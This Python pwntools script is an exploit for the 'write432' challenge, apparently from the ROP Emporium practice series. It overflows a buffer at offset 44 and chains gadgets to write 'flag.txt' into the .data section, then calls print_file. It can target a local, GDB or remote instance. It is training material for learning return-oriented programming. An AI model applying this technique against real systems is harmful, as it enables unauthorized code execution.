from pwn import *
import warnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './write432'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
warnings.filterwarnings("ignore")

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

offset = 44

# I want to write the value of flag.txt into the .data section (size = 8)
data_addr = 0x804a018

# pop the value of .data section into edi then pop the string flag.txt into ebp
pop_edi_pop_ebp = 0x080485aa # pop edi; pop ebp; ret; 

# move the value of ebp (flag.txt) to the address pointed by edi (.data)
mov_gadget = 0x08048543 # mov dword ptr [edi], ebp; ret; 

# print file function (we will call print file function passing in the value flag.txt)
print_file = 0x80483d0 

info("data address %#x", data_addr)
info("pop edi; pop ebp %#x", pop_edi_pop_ebp)
info("mov  dword ptr [edi], ebp; %#x", mov_gadget)
info("prinf file function address %#x", print_file)

# Build the payload
payload = flat({
    offset: [
        pop_edi_pop_ebp,
        data_addr,
        b'flag',
        mov_gadget,
        pop_edi_pop_ebp,
        data_addr + 0x4,
        b'.txt',
        mov_gadget,
        print_file,
        0x0,
        0x804a018
    ]
})

# Send the payload
io.sendlineafter(b'>', payload)
io.recvuntil(b'Thank you!')

io.recvline()

flag = io.recvline()
success(flag)
